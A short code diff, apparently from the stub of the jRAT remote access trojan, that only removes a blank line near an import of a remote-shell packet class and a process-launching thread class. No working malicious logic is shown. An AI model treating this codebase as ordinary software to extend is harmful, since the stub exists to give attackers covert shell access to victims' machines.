@@ -5,7 +5,6 @@ import java.io.InputStreamReader;
 
 import pro.jrat.stub.packets.outgoing.Packet21RemoteShell;
 
-
 public class LaunchProcess extends Thread {
 
 	public Process p;
